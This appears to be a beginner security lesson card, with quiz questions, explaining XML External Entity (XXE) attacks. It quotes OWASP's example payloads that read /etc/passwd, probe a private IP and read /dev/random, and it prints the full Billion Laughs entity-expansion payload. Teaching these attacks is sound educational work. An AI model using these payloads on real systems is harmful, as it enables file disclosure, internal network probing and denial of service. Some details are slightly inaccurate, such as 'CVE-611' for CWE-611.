---
author: lizTheDeveloper

levels:

  - beginner

  - basic

  - medium

aspects:

  - introduction

  - workout

type: normal

category: hack


standards:
  security.xxe.0: 10

links:
  - '[OWASP Top Ten](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)'
  - '[Billion Laughs Attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)'
  - '[Security Briefs - XML Denial of Service Attacks and Defenses](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx)'
  - '[SAML Security XML External Entity Attack](https://secretsofappsecurity.blogspot.com/2017/01/saml-security-xml-external-entity-attack.html)'
  - '[Detecting and exploiting XXE in SAML Interfaces](https://web-in-security.blogspot.com/2014/11/detecting-and-exploiting-xxe-in-saml.html)'
  - '[CVE-611](https://cwe.mitre.org/data/definitions/611.html)'

---

# eXternal XML Entities

---
## Content
OWASP describes XXE as Xternal XML Entities, which is a vulnerability vector in XML documents that allows them to embed other documents, including local system files, in XML documents. If these processors run or execute these files with elevated permissions, attackers can inject malicious instructions in their XML files.

These examples from *OWASP's Top Ten* list show how the data can be configured to execute external scripts:

**Scenario #1**: The attacker attempts to extract data from the
server:
```
<?xml version="1.0"
 encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM
 "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

**Scenario #2**: An attacker probes the server's private network by
changing the above ENTITY line to:
```
<!ENTITY xxe
SYSTEM "https://192.168.1.1/private" >]>
```
**Scenario #3**: An attacker attempts a denial-of-service attack by
including a potentially endless file:
```
<!ENTITY xxe
SYSTEM "file:///dev/random" >]>
```
 
Here's an example of this attack that was a widespread problem due to it's simplicity, called the **Billion Laughs Attack**:

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1
 "&lol;&lol;&lol;&lol;&lol;
  &lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2
 "&lol1;&lol1;&lol1;&lol1;&lol1;
 &lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3
 "&lol2;&lol2;&lol2;&lol2;&lol2;
 &lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4
 "&lol3;&lol3;&lol3;&lol3;&lol3;
 &lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5
 "&lol4;&lol4;&lol4;&lol4;&lol4;
 &lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6
 "&lol5;&lol5;&lol5;&lol5;&lol5;
 &lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7
 "&lol6;&lol6;&lol6;&lol6;&lol6;
 &lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8
 "&lol7;&lol7;&lol7;&lol7;&lol7;
 &lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9
 "&lol8;&lol8;&lol8;&lol8;&lol8;
 &lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
From Wikipedia:

> When an XML parser loads this document, it sees that it includes one root element, "lolz", that contains the text "&lol9;". However, "&lol9;" is a defined entity that expands to a string containing ten "&lol8;" strings. Each "&lol8;" string is a defined entity that expands to ten "&lol7;" strings, and so on. After all the entity expansions have been processed, this small (< 1 KB) block of XML will actually contain 10^9 = a billion "lol"s, taking up almost 3 gigabytes of memory.

---
## Practice

An XXE attack affects what components of an application?
???

* XML Processors
* HTTP Endpoints
* Network Firewall
* HTML DOM


---
## Revision

An XXE attack comes from exploiting what?
???

* External Entities
* Unvalidated Input
* Untested Code
* Malformed Requests
